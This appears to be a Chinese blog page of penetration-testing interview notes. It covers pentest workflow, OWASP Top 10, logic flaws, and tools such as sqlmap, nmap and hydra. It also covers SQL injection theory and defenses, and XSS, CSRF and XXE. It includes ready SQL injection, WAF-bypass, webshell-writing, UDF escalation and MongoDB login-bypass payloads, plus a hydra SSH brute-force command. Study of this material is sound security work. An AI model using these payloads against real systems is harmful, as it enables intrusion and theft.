<li>信息收集：whois、网站源IP、旁站、C段网站、服务器系统版本、容器版本、程序版本、数据库类型、二级域名、防火墙、维护者信息</li>
<li>漏洞扫描：Nessus, AWVS</li>
<li>手动挖掘：逻辑漏洞</li>
<li>验证漏洞</li>
<li>修复建议</li>
<li>（如果有）基线检查/复验漏洞</li>
<li>输出报告<ul>
<li>概述</li>
<li>测试基本信息<ul>
<li>测试范围</li>
<li>测试时间</li>
<li>测试任务</li>
<li>测试过程</li>
</ul>
</li>
<li>信息安全风险综合分析<ul>
<li>整体风险分析</li>
<li>风险影响分析</li>
<li>系统安全分析</li>
<li>安全漏洞列表</li>
</ul>
</li>
<li>解决方案建议</li>
<li>复测报告</li>
</ul>
</li>
</ol>
<h3 id="渗透测试项目"><a href="#渗透测试项目" class="headerlink" title="渗透测试项目"></a>渗透测试项目</h3><p>用七八句话概括一下发现、验证漏洞细节、扮演角色、具体工作。<br>如果技术人员有兴趣会继续问，接着再引导到别处，让自己多说说细节。</p>
<h3 id="渗透测试具体实施"><a href="#渗透测试具体实施" class="headerlink" title="渗透测试具体实施"></a>渗透测试具体实施</h3><h3 id="17年OWASP-TOP10"><a href="#17年OWASP-TOP10" class="headerlink" title="17年OWASP TOP10"></a>17年OWASP TOP10</h3><ul>
<li>注入:sql,nosql,ldap,os</li>
<li>失效的身份认证: </li>
<li>敏感信息泄漏</li>
<li>XXE XML外部实体</li>
<li>失效的访问控制：管理页面仅能管理员权限访问；越权漏洞</li>
<li>安全配置错误：页面错误信息，默认密码，使用已知漏洞的应用</li>
<li>XSS</li>
<li>不安全的反序列化：一个PHP论坛使用PHP对象序列化来保存一个cookie，用户修改cookie即可伪造管理员登陆</li>
<li>使用含有已知漏洞的组件：比如structs2框架</li>
<li>不足的日志记录和监控：代码被删除，无法溯源；记录登陆失败次数；监控问题没被管理员响应</li>
</ul>
<h3 id="常见的Web安全漏洞"><a href="#常见的Web安全漏洞" class="headerlink" title="常见的Web安全漏洞"></a>常见的Web安全漏洞</h3><ul>
<li>SQL注入</li>
<li>XSS</li>
<li>文件遍历、文件上传、文件下载</li>
<li>垂直越权、水平越权</li>
<li>逻辑漏洞</li>
</ul>
<h3 id="挖过什么逻辑漏洞"><a href="#挖过什么逻辑漏洞" class="headerlink" title="挖过什么逻辑漏洞"></a>挖过什么逻辑漏洞</h3><h4 id="订单任意金额修改"><a href="#订单任意金额修改" class="headerlink" title="订单任意金额修改"></a>订单任意金额修改</h4><p>相同价格增加订单数量，相同订单数量减少产品价格，订单价格设定为负数。</p>
<p>预防思路：</p>
<ul>
<li>订单需要多重效验<br><img src="http://image.3001.net/images/20160819/14715932566558.png" alt></li>
<li>订单数值较大的时候需要人工审核</li>
</ul>
<h4 id="验证码回传"><a href="#验证码回传" class="headerlink" title="验证码回传"></a>验证码回传</h4><p>漏洞一般发生在账号密码找回、账号注册、支付订单等。验证码发送途径一般为手机短信、邮箱邮件</p>
<p>预防思路：</p>
<ul>
<li>response数据内不包含验证码，验证方式主要采取后端验证，但是缺点是服务器的运算压力也会随之增加</li>
<li>如果要进行前端验证的话也可以，但是需要进行加密</li>
</ul>
<h4 id="未进行登陆凭证验证"><a href="#未进行登陆凭证验证" class="headerlink" title="未进行登陆凭证验证"></a>未进行登陆凭证验证</h4><p>有些业务的接口，因为缺少了对用户的登陆凭证的效验或者是验证存在缺陷，导致黑客可以未经授权访问这些敏感信息甚至是越权操作。比如后台页面、订单ID枚举、敏感信息可下载、没验证ID或cookie验证导致越权。</p>
<p>预防思路：</p>
<ul>
<li>对敏感数据存在的接口和页面做cookie，ssid，token或者其它验证</li>
</ul>
<h4 id="接口无限制枚举"><a href="#接口无限制枚举" class="headerlink" title="接口无限制枚举"></a>接口无限制枚举</h4><ul>
<li>某电商登陆接口无验证导致撞库</li>
<li>某招聘网验证码无限制枚举</li>
<li>某快递公司优惠券枚举</li>
<li>某电商会员卡卡号枚举</li>
</ul>
<p>预防思路：</p>
<ul>
<li><p>在输入接口设置验证，如token，验证码等。如果设定验证码，最好不要单纯的采取一个前端验证，最好选择后端验证。如果设定token，请确保每个token只能采用一次，并且对token设定时间参数。</p>
</li>
<li><p>注册界面的接口不要返回太多敏感信息，以防遭到黑客制作枚举字典。</p>
</li>
<li><p>验证码不要用短数字，尽量6位以上，最好是以字母加数字进行组合，并且验证码需要设定时间期限。</p>
</li>
<li><p>优惠券，VIP卡号请尽量不要存在规律性和简短性，并且优惠券最好是以数字加字母进行组合。</p>
</li>
</ul>
<h4 id="cookie设置存在缺陷"><a href="#cookie设置存在缺陷" class="headerlink" title="cookie设置存在缺陷"></a>cookie设置存在缺陷</h4><ul>
<li>Cookie的效验值过于简单。有些web对于cookie的生成过于单一或者简单，导致黑客可以对cookie的效验值进行一个枚举.</li>
<li>cookie存在被盗风险，即用户重置密码后使用老cookie依然可以通过验证</li>
<li>用户的cookie数据加密应严格使用标准加密算法，并注意密钥管理。不能采取简单的base64等算法</li>
<li>越权：平行越权：权限类型不变，权限ID改变；垂直越权：权限ID不变，权限类型改变；交叉越权：即改变ID，也改变权限</li>
</ul>
<p>预防思路</p>
<ol>
<li>cookie中设定多个验证，比如自如APP的cookie中，需要sign和ssid两个参数配对，才能返回数据。</li>
<li>用户的cookie数据加密应严格使用标准加密算法，并注意密钥管理。</li>
<li>用户的cookie的生成过程中最好带入用户的密码，一旦密码改变，cookie的值也会改变。</li>
<li>cookie中设定session参数，以防cookie可以长时间生效。</li>
<li>根据业务不同还有很多方法</li>
</ol>
<h3 id="找回密码功能缺陷"><a href="#找回密码功能缺陷" class="headerlink" title="找回密码功能缺陷"></a>找回密码功能缺陷</h3><ol start="2">
<li>单纯读取内存值作为用户凭证</li>
<li>电商系统加车、下单漏洞</li>
</ol>
<h3 id="你常用的渗透工具有哪些，最常用的是哪个？"><a href="#你常用的渗透工具有哪些，最常用的是哪个？" class="headerlink" title="你常用的渗透工具有哪些，最常用的是哪个？"></a>你常用的渗透工具有哪些，最常用的是哪个？</h3><h4 id="扫描-Nessus-AWVS-Nikto"><a href="#扫描-Nessus-AWVS-Nikto" class="headerlink" title="扫描:Nessus,AWVS,Nikto"></a>扫描:Nessus,AWVS,Nikto</h4><h4 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h4><blockquote>
<p><a href="https://blog.csdn.net/ski_12/article/details/58188331" target="_blank" rel="noopener">https://blog.csdn.net/ski_12/article/details/58188331</a></p>
</blockquote>
<p>常用参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-u 单个URL -m xx.txt 多个URL</span><br><span class="line">-d &quot;mysql://user:password@10.10.10.137:3306/dvwa&quot;  作为服务器客户端，直接连接数据库</span><br><span class="line">--data post/get都适用</span><br><span class="line">-p 指定扫描的参数</span><br><span class="line">-r 读取文件</span><br><span class="line">-f 指纹信息</span><br><span class="line">--tamper 混淆脚本，用于应用层过滤</span><br><span class="line">--cookie --user-agent --host等等http头的修改</span><br><span class="line">--threads 并发线程 默认为1</span><br><span class="line">--dbms MySQL&lt;5.0&gt; 指定数据库或版本</span><br><span class="line"></span><br><span class="line">–level=LEVEL 执行测试的等级（1-5，默认为 1）</span><br><span class="line">–risk=RISK 执行测试的风险（0-3，默认为 1） Risk升高可造成数据被篡改等风险</span><br><span class="line">–current-db / 获取当前数据库名称</span><br><span class="line">–dbs 枚举数据库管理系统数据库</span><br><span class="line">–tables 枚举 DBMS 数据库中的表</span><br><span class="line">–columns 枚举 DBMS 数据库表列</span><br><span class="line">-D DB 要进行枚举的数据库名</span><br><span class="line">-T TBL 要进行枚举的数据库表</span><br><span class="line">-C COL 要进行枚举的数据库列</span><br><span class="line">-U USER 用来进行枚举的数据库用户</span><br></pre></td></tr></table></figure>

<p>常用的tamper</p>
<blockquote>
<p>本地：sqlmap-tamper分类.xlsx</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">base64encode.py #转为b64编码</span><br><span class="line">charencode.py url编码</span><br><span class="line">chardoubleencode.py 双URL编码</span><br><span class="line">unmagicquotes.py 宽字节</span><br><span class="line">randomcomments.py 用/**/分割SQL关键字</span><br><span class="line">space2plus.py space2comment.py space2xxxx.py 替换空格为xx</span><br></pre></td></tr></table></figure>

<h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap hostname/ip或者多个ip或者子网192.168.123.*</span><br><span class="line">-iL ip.txt 扫描ip.txt的所有ip</span><br><span class="line">-A 包含了-sV，-O，探测操作系统信息和路由跟踪。一般不用，是激烈扫描</span><br><span class="line">-O 探测操作系统信息</span><br><span class="line">-sV 查找主机服务版本号</span><br><span class="line">-sA 探测该主机是否使用了包过滤器或防火墙</span><br><span class="line">-sS 半开扫描，一般不会记入日志，不过需要root权限。</span><br><span class="line">-sT TCP connect()扫描，这种方式会在目标主机的日志中记录大批的链接请求以及错误信息。</span><br><span class="line">-sP ping扫描，加上这个参数会使用ping扫描，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping，却实际存在。</span><br><span class="line">-sN TCP空扫描</span><br><span class="line">-F 快速扫描</span><br><span class="line">-Pn 扫描之前不使用ping，适用于防火墙禁止ping，比较有用。</span><br><span class="line">-p 指定端口/端口范围</span><br><span class="line">-oN 将报告写入文件</span><br><span class="line">-v 详细信息</span><br><span class="line">-T&lt;0-5&gt; 设定速度</span><br></pre></td></tr></table></figure>
<p>Nmap还可以用到爆破等一些脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--script all 使用所有脚本</span><br><span class="line">--script=sql.injection.nse sql注入</span><br><span class="line">--script=&quot;smb*&quot;  扫smb系列</span><br></pre></td></tr></table></figure>


<h4 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h4><p>使用内置模块。HR：常用的模块有哪些？<br>tcp反向链接 msfvenom</p>
<h4 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h4><p>密码爆破工具，FTP，MSSQL，MYSQL，POP3，SSH，rdp，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">hydra IP -l loginname -P pass.txt PROTROCL</span><br><span class="line">hydra 127.0.0.1 -l root -P pass.txt ssh</span><br></pre></td></tr></table></figure>

<h4 id="kali信息收集工具"><a href="#kali信息收集工具" class="headerlink" title="kali信息收集工具"></a>kali信息收集工具</h4><ul>
<li>dig</li>
<li>whois</li>
<li>host:查询dns服务器</li>
<li>nslookup</li>
<li>域名枚举：fierse -dns</li>
<li>maltego</li>
<li>onesixtyone</li>
</ul>
<h4 id="流量分析WireShark"><a href="#流量分析WireShark" class="headerlink" title="流量分析WireShark"></a>流量分析WireShark</h4><p>CTF</p>
<h3 id="描述一个你深入研究过的CVE或POC-ms17-010-最新的CVE"><a href="#描述一个你深入研究过的CVE或POC-ms17-010-最新的CVE" class="headerlink" title="描述一个你深入研究过的CVE或POC(ms17-010/最新的CVE)"></a>描述一个你深入研究过的CVE或POC(ms17-010/最新的CVE)</h3><h2 id="数据库注入"><a href="#数据库注入" class="headerlink" title="数据库注入"></a>数据库注入</h2><blockquote>
<p><a href="https://www.zhihu.com/question/22953267" target="_blank" rel="noopener">https://www.zhihu.com/question/22953267</a></p>
</blockquote>
<h3 id="MySQL面试题"><a href="#MySQL面试题" class="headerlink" title="MySQL面试题"></a>MySQL面试题</h3><h4 id="MySQL存储引擎？"><a href="#MySQL存储引擎？" class="headerlink" title="MySQL存储引擎？"></a>MySQL存储引擎？</h4><ol>
<li>InnoDB：主流的存储引擎。支持事务、支持行锁、支持非锁定读、支持外键约束</li>
</ol>
<ul>
<li>为MySQL提供了具有提交、回滚和崩溃恢复能力的事物安全（ACID兼容）存储引擎。InnoDB锁定在行级并且也在 SELECT语句中提供一个类似Oracle的非锁定读。这些功能增加了多用户部署和性能。在SQL查询中，可以自由地将InnoDB类型的表和其他MySQL的表类型混合起来，甚至在同一个查询中也可以混合</li>
<li>InnoDB存储引擎为在主内存中缓存数据和索引而维持它自己的缓冲池。InnoDB将它的表和索引在一个逻辑表空间中，表空间可以包含数个文件（或原始磁盘文件）。这与MyISAM表不同，比如在MyISAM表中每个表被存放在分离的文件中。InnoDB表可以是任何尺寸，即使在文 件尺寸被限制为2GB的操作系统上</li>
<li>InnoDB支持外键完整性约束，存储表中的数据时，每张表的存储都按主键顺序存放，如果没有显示在表定义时指定主键，InnoDB会为每一行生成一个6字节的ROWID，并以此作为主键</li>
</ul>
<ol start="2">
<li>MyISAM：访问速度快，不支持事务，逐渐被淘汰</li>
<li>MEMORY：BTREE索引或者HASH索引。将表中数据放在内存中，并发性能差。<code>information_schema</code>用的是该引擎</li>
<li>MERGE、Archive等等不常用的</li>
</ol>
<h4 id="什么是事务？"><a href="#什么是事务？" class="headerlink" title="什么是事务？"></a>什么是事务？</h4><p>事务是一组原子性的SQL语句或者说是一个独立的工作单元，如果数据库引擎能够成功对数据库应用这组SQL语句，那么就执行，如果其中有任何一条语句因为崩溃或其它原因无法执行，那么所有的语句都不会执行。也就是说，事务内的语句，要么全部执行成功，要么全部执行失败。<br>举个银行应用的典型例子：</p>
<p>假设银行的数据库有两张表：支票表和储蓄表，现在某个客户A要从其支票账户转移2000元到其储蓄账户，那么至少需求三个步骤：</p>
<p>a.检查A的支票账户余额高于2000元；</p>
<p>b.从A的支票账户余额中减去2000元；</p>
<p>c.在A的储蓄账户余额中增加2000元。</p>
<p>这三个步骤必须要打包在一个事务中，任何一个步骤失败，则必须要回滚所有的步骤，否则A作为银行的客户就可能要莫名损失2000元，就出问题了。这就是一个典型的事务，这个事务是不可分割的最小工作单元，整个事务中的所有操作要么全部提交成功，要么全部失败回滚，不可能只执行其中一部分，这也是事务的原子性特征。</p>
<h4 id="读锁和写锁"><a href="#读锁和写锁" class="headerlink" title="读锁和写锁"></a>读锁和写锁</h4><p>读锁是共享的，即相互不阻塞的，多个客户在同一时刻可以读取同一资源，互不干扰。写锁是排他的，即一个写锁会阻塞其它的写锁和读锁，只有这样，才能确保给定时间内，只有一个用户能执行写入，防止其它用户读取正在写入的同一资源。写锁优先级高于读锁。</p>
<h4 id="MySQL的索引"><a href="#MySQL的索引" class="headerlink" title="MySQL的索引"></a>MySQL的索引</h4><p>索引是帮助MySQL高效获取数据的数据结构。MYISAM和InnoDB存储引擎只支持BTree索引；MEMORY和HEAP储存引擎可以支持HASH和BTREE索引。</p>
<h4 id="ORDER-BY在注入的运用"><a href="#ORDER-BY在注入的运用" class="headerlink" title="ORDER BY在注入的运用"></a>ORDER BY在注入的运用</h4><h4 id="GPC是什么？GPC之后怎么绕过？"><a href="#GPC是什么？GPC之后怎么绕过？" class="headerlink" title="GPC是什么？GPC之后怎么绕过？"></a>GPC是什么？GPC之后怎么绕过？</h4><p>如果<code>magic_quotes_gpc=On</code>，PHP解析器就会自动为post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符（认为是php的字符）引起的污染。</p>
<h4 id="Mysql一个-和两个-什么区别"><a href="#Mysql一个-和两个-什么区别" class="headerlink" title="Mysql一个@和两个@什么区别"></a>Mysql一个@和两个@什么区别</h4><ul>
<li>@为用户变量，使用<code>SET @var1=1</code>赋值</li>
<li>@@ 为系统变量 ，包括全局变量<code>show global variables \G;</code>和会话变量<code>show session variables \G;</code></li>
</ul>
<h4 id="注入-绕过常用的函数"><a href="#注入-绕过常用的函数" class="headerlink" title="注入/绕过常用的函数"></a>注入/绕过常用的函数</h4><ol>
<li>基于布尔SQL盲注<ul>
<li><code>left(database(),1)&gt;&#39;s&#39;</code></li>
<li><code>ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 --+</code></li>
<li><code>ascii(substr((select database()),1,1))=98</code></li>
<li><code>ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&gt;98%23</code></li>
<li><code>regexp</code>正则注入 <code>select user() regexp &#39;^[a-z]&#39;;</code></li>
<li><code>select user() like &#39;ro%&#39;</code></li>
</ul>
</li>
<li>基于报错的SQL盲注<ul>
<li><code>Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;</code></li>
</ul>
</li>
</ol>
<h4 id="MySQL存储过程"><a href="#MySQL存储过程" class="headerlink" title="MySQL存储过程"></a>MySQL存储过程</h4><h4 id="各种写shell的问题"><a href="#各种写shell的问题" class="headerlink" title="各种写shell的问题"></a>各种写shell的问题</h4><ol>
<li>写shell用什么函数？ <ul>
<li><code>select &#39;&lt;?php phpinfo()&gt; into outfile &#39;D:/shelltest.php&#39;</code></li>
<li><code>dumpfile</code></li>
<li><code>file_put_contents</code></li>
</ul>
</li>
<li>outfile不能用了怎么办？ <code>select unhex(&#39;udf.dll hex code&#39;) into dumpfile &#39;c:/mysql/mysql server 5.1/lib/plugin/xxoo.dll&#39;;</code>可以UDF提权 <a href="https://www.cnblogs.com/milantgh/p/5444398.html" target="_blank" rel="noopener">https://www.cnblogs.com/milantgh/p/5444398.html</a></li>
<li>dumpfile和outfile有什么不一样？outfile适合导库，在行末尾会写入新行并转义，因此不能写入二进制可执行文件。</li>
<li>sleep()能不能写shell？</li>
<li>写shell的条件？<ul>
<li>用户权限</li>
<li>目录读写权限</li>
<li>防止命令执行：<code>disable_functions</code>，禁止了<code>disable_functions=phpinfo,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source</code>，但是可以用dl扩展执行命令或者ImageMagick漏洞 <a href="https://www.waitalone.cn/imagemagic-bypass-disable_function.html" target="_blank" rel="noopener">https://www.waitalone.cn/imagemagic-bypass-disable_function.html</a></li>
<li>open_basedir: 将用户可操作的文件限制在某目录下</li>
</ul>
</li>
</ol>
<h4 id><a href="#" class="headerlink" title></a></h4><h3 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h3><ol>
<li>基于报错注入</li>
<li>基于布尔的注入，根据返回页面判断条件真假的注入</li>
<li>基于时间的盲注，不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li>
<li>宽字节注入</li>
<li>联合查询，可以使用 union 的情况下的注入。</li>
<li>堆查询注入，可以同时执行多条语句的执行时的注入。</li>
</ol>
<h3 id="SQL注入的原理"><a href="#SQL注入的原理" class="headerlink" title="SQL注入的原理"></a>SQL注入的原理</h3><p>通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。通常未经检查或者未经充分检查的用户输入数据或代码编写问题，意外变成了代码被执行。</p>
<h3 id="过waf"><a href="#过waf" class="headerlink" title="过waf"></a>过waf</h3><blockquote>
<p><a href="https://blog.csdn.net/wjy397/article/details/53263281" target="_blank" rel="noopener">https://blog.csdn.net/wjy397/article/details/53263281</a></p>
</blockquote>
<ol>
<li>确定waf类型，狗、盾、神、锁、宝、卫士</li>
<li>使用注释符号或者特殊符号或者多个特殊符号重复<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># </span><br><span class="line">--</span><br><span class="line">-- - //5.6.12特性，需要加空格</span><br><span class="line">--+</span><br><span class="line">//</span><br><span class="line">/**/ //c风格注释</span><br><span class="line">/**//**/  //多个注释</span><br><span class="line">/*letmetest*/</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 科学记数法</span><br><span class="line">id=0e1union select</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 空白字符</span><br><span class="line">SQLite3 0A 0D 0C 09 20 </span><br><span class="line">MySQL5 09 0A 0B 0C 0D A0 20 </span><br><span class="line">PosgresSQL 0A 0D 0C 09 20 </span><br><span class="line">Oracle 11g 00 0A 0D 0C 09 20 </span><br><span class="line">MSSQL 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20</span><br></pre></td></tr></table></figure></li>
<li>使用sql内置函数或者关键字<blockquote>
<p>报错注入 <a href="https://blog.csdn.net/like98k/article/details/79646512" target="_blank" rel="noopener">https://blog.csdn.net/like98k/article/details/79646512</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 常用</span><br><span class="line">extractvalue</span><br><span class="line">updatexml 报错注入</span><br><span class="line">UPDATEXML (XML_document, XPath_string, new_value); </span><br><span class="line">or updatexml(1, concat(0x7e, (version()), 0x7e), 0);</span><br><span class="line">&gt; select * from  users where id = 1 and updatexml(1, concat(0x7e, (version()), 0x7e), 0);</span><br><span class="line">&gt; version() database() (SELECT concat(column_name) FROM information_schema.columns WHERE table_name=&apos;users&apos; limit 0,1</span><br><span class="line"></span><br><span class="line">floor()</span><br><span class="line">ceil()</span><br><span class="line">Mid(version(),1,1)</span><br><span class="line">Substr(version(),1,1)</span><br><span class="line">Substring(version(),1,1)</span><br><span class="line">concat(version(),&apos;|&apos;,user());</span><br><span class="line">concat_ws(&apos;|&apos;,1,2,3)</span><br><span class="line">Char(49)</span><br><span class="line">Hex(&apos;a&apos;)</span><br><span class="line">Unhex(61)</span><br><span class="line">过滤了逗号</span><br><span class="line">(1)limit处的逗号：</span><br><span class="line">limit 1 offset 0</span><br><span class="line">(2)字符串截取处的逗号</span><br><span class="line">mid处的逗号：</span><br><span class="line">mid(version() from 1 for 1)</span><br></pre></td></tr></table></figure>


</li>
</ol>
<ol start="4">
<li>利用容器特性，比如iis+asp的环境可能会吞掉%(f%rom-&gt;from)造成注入，或者iis支持unicode解析，当我们请求的url存在unicode字符串的话iis会自动将其转换，但waf可能不会拦截造成注入</li>
<li>畸形协议/请求。asp/asp.net在解析请求的时候，允许application/x-www-form-urlencoded的数据提交方式;php+apache解析协议除了get/post外随便定义协议也可能过</li>
<li>%0a换行</li>
<li>多次URL编码，waf的一根筋过滤<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unlencode</span><br><span class="line">base64</span><br><span class="line">json</span><br><span class="line">binary</span><br><span class="line">querystring</span><br><span class="line">htmlencode</span><br><span class="line">unicode</span><br><span class="line">php serialize</span><br></pre></td></tr></table></figure></li>
<li>http参数污染，<code>id=1&amp;id=2&amp;id=3</code> <code>id=1,2,3</code></li>
</ol>
<h3 id="如何进行SQL注入的防御"><a href="#如何进行SQL注入的防御" class="headerlink" title="如何进行SQL注入的防御"></a>如何进行SQL注入的防御</h3><ol>
<li><p>关闭应用的错误提示 </p>
</li>
<li><p>加waf</p>
</li>
<li><p>对输入进行过滤</p>
</li>
<li><p>限制输入长度</p>
</li>
<li><p>限制好数据库权限，drop/create/truncate等权限谨慎grant</p>
</li>
<li><p>预编译好sql语句，python和Php中一般使用?作为占位符。这种方法是从编程框架方面解决利用占位符参数的sql注入，只能说一定程度上防止注入。还有缓存溢出、终止字符等。</p>
</li>
<li><p>数据库信息加密安全（引导到密码学方面）。不采用md5因为有彩虹表，一般是一次md5后加盐再md5</p>
</li>
<li><p>清晰的编程规范，结对/自动化代码 review ，加大量现成的解决方案（PreparedStatement，ActiveRecord，歧义字符过滤， 只可访问存储过程 balabala）已经让 SQL 注入的风险变得非常低了。</p>
</li>
<li><p>具体的语言如何进行防注入，采用什么安全框架</p>
</li>
</ol>
<blockquote>
<p>作者：没啥意思<br>链接：<a href="https://www.zhihu.com/question/22953267/answer/23222069" target="_blank" rel="noopener">https://www.zhihu.com/question/22953267/answer/23222069</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
</blockquote>
<blockquote>
<p>SQL注入问题既不能“靠用户（开发者也是用户）的自觉去避免”，也不能完全脱离用户（开发者也是用户）而指望数据库层面去避免。对于那些不了解SQL注入漏洞细节或不关心SQL注入漏洞或没精力去关心SQL注入漏洞的工程师，你要给他们一条尽可能简单可行透明的方案来避免SQL注入漏洞，告诉他这样写就可以了，这就是安全框架；然后告诉他或者让他的老大告诉他你必须这样写，这就是安全编码规范；然后你有手段在他没有这样写的时候能够检查出来（这比检查出漏洞要容易）并推动他改正，这就是白盒检查。</p>
</blockquote>
<blockquote>
<p>我们现在的互联网产品SQL注入漏洞仍然层出不穷，并不是这套思路有问题，相反恰恰是这套思路没有完善。一方面是框架方案本身不完善，以SQL注入漏洞为例，参数化是防SQL注入框架级方案的重要部分，但仅靠参数化没法很好满足开发过程中一些常见需求，如逗号分割的id列表问题、排序标记的问题等等（其实这些问题真要用参数化的方案解决也可以），使得开发更愿意在这些地方使用非参数化或伪参数化的方法（比如拼接SQL片段后再把整个片段当作参数扔进去exec）。这些问题在参数化的基础上，再加以改进，仍然守着拼接SQL片段时进行强类型转换的思路，仍然是能很好解决的，也就是继续完善参数化方案的问题，而不是看上去那样“参数化解决不了问题”。另一方面，安全编码规范的制定、培训、流程建设和实施保证上也做得远远不到位，开发leader们更希望后面的数据库或者前面的安全防御上能有手段去解决SQL注入问题，对于安全工程师来说，设置并维护几个特征串、语法分析场景也远比做那些安全框架、编码规范、白盒扫描来得要轻松实在，彼此在心照不宣中度过今天，自然不能指望明天能彻底踏实。</p>
</blockquote>
<h3 id="mysql的网站注入，5-0以上和5-0以下有什么区别？"><a href="#mysql的网站注入，5-0以上和5-0以下有什么区别？" class="headerlink" title="mysql的网站注入，5.0以上和5.0以下有什么区别？"></a>mysql的网站注入，5.0以上和5.0以下有什么区别？</h3><p>10年前就出了5.0，现在都到5.7了，没啥意义的问题</p>
<ul>
<li>5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。</li>
<li>5.0以下是多用户单操作，5.0以上是多用户多操做。</li>
</ul>
<h3 id="SQL和NoSQL的区别"><a href="#SQL和NoSQL的区别" class="headerlink" title="SQL和NoSQL的区别"></a>SQL和NoSQL的区别</h3><p>SQL关系型数据库，NoSQL(Not only SQL)非关系型数据库</p>
<h4 id="SQL优点"><a href="#SQL优点" class="headerlink" title="SQL优点"></a>SQL优点</h4><p>关系型数据库是指用关系数学模型来表示的数据，其中是以二维表的形式描述数据。</p>
<ol>
<li>结构稳定，不易修改，常用联表查询</li>
<li>查询能力高，可以操作很复杂的查询</li>
<li>一致性高，处理数据会使用封锁保证数据不被改变</li>
<li>表具有逻辑性，易于理解</li>
</ol>
<h4 id="SQL缺点"><a href="#SQL缺点" class="headerlink" title="SQL缺点"></a>SQL缺点</h4><ol>
<li>不适用高并发读写</li>
<li>不适用海量数据高效读写</li>
<li>层次多，扩展性低</li>
<li>维护一致性开销大</li>
<li>涉及联表查询，复杂，慢</li>
</ol>
<h4 id="NoSQL优点"><a href="#NoSQL优点" class="headerlink" title="NoSQL优点"></a>NoSQL优点</h4><p>采用键值对存储数据</p>
<ol>
<li>由于数据之间没有关系，所以易扩展，也易于查询</li>
<li>数据结构灵活，每个数据都可以有不同的结构</li>
<li>由于降低了一致性的要求，所以查询速度更快</li>
</ol>
<h4 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h4><p>非关系型数据库的产生是因为随着网站的进化，并发性增加，扩展性高，一致性要求降低。这样关系型数据库最重要的一致性维护就显得有点多余，并且消耗着性能。因此有了非关系型数据库，它可以算是关系型数据库的一种弱化的结果，在海量数据存储和查询上更胜一筹。</p>
<p>两种数据库没有好坏之分，只是使用的环境不一样。关系型数据库可以说是更严谨的，可靠性更强的数据库，在对于数据精度要求高的环境，比如说银行系统这样自然是像mysql这样的数据库适合。非关系型数据库胜在处理大数据的速度，但是对于数据的准确度没有那么高，对于操作量大的环境比如当前大部分web2.0的网站更加适用一些。</p>
<h4 id="MongoDB注入方式"><a href="#MongoDB注入方式" class="headerlink" title="MongoDB注入方式"></a>MongoDB注入方式</h4><p>利用正则：找到y开头的name   <code>db.items.find({name: {$regex: &quot;^y&quot;}})</code></p>
<p>一些payload</p>
<ol>
<li><code>?login[$regex]=^&amp;password[$regex]=^</code></li>
<li><code>?login[$not][$type]=1&amp;password[$not][$type]=1</code></li>
</ol>
<h2 id="XSS-CSRF-XXE"><a href="#XSS-CSRF-XXE" class="headerlink" title="XSS CSRF XXE"></a>XSS CSRF XXE</h2><h3 id="CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？"><a href="#CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？" class="headerlink" title="CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？"></a>CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</h3><blockquote>
<p>xss学习 <a href="https://www.secpulse.com/?s=+%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS+" target="_blank" rel="noopener">https://www.secpulse.com/?s=+%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS+</a></p>
</blockquote>
<p>XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。 </p>
<p>CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer.</p>
<p>XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。</p>
